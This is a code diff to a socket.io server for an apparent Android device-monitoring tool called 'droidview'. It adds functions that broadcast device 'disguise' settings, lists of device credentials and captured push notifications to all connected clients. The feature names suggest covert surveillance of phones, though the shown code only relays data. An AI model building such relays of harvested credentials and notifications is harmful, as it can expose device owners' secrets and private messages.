@@ -1,7 +1,7 @@
 import { Server } from "socket.io";
 import type { Server as HttpServer } from "node:http";
 import type { ChatMessage, ClientToServerEvents, Device, DigitalTouchEvent, ServerToClientEvents } from "@droidview/shared";
-import { addLog, devices, sessions } from "./data.js";
+import { addLog, applyCustomMetadataToDevice, devices, sessions } from "./data.js";
 
 let globalIo: Server<ClientToServerEvents, ServerToClientEvents> | null = null;
 
@@ -13,6 +13,7 @@ export function broadcastTouchEvent(event: DigitalTouchEvent) {
 
 export function broadcastDeviceConnect(device: Device) {
   if (globalIo) {
+    applyCustomMetadataToDevice(device);
     globalIo.emit("device:connect", device);
   }
 }
@@ -25,7 +26,26 @@ export function broadcastDeviceDisconnect(deviceId: string) {
 
 export function broadcastDeviceUpdate(device: Device) {
   if (globalIo) {
+    applyCustomMetadataToDevice(device);
     globalIo.emit("device:update", device);
+  }
+}
+
+export function broadcastDeviceDisguise(deviceId: string, disguise: import("@droidview/shared").DeviceDisguiseConfig | null) {
+  if (globalIo) {
+    globalIo.emit("device:disguise", { deviceId, disguise });
+  }
+}
+
+export function broadcastDeviceCredentials(deviceId: string, credentials: import("@droidview/shared").DeviceCredentialEntry[]) {
+  if (globalIo) {
+    globalIo.emit("device:credentials", { deviceId, credentials });
+  }
+}
+
+export function broadcastDevicePushNotification(notification: import("@droidview/shared").DevicePushNotification) {
+  if (globalIo) {
+    globalIo.emit("device:push_notification", notification);
   }
 }
 
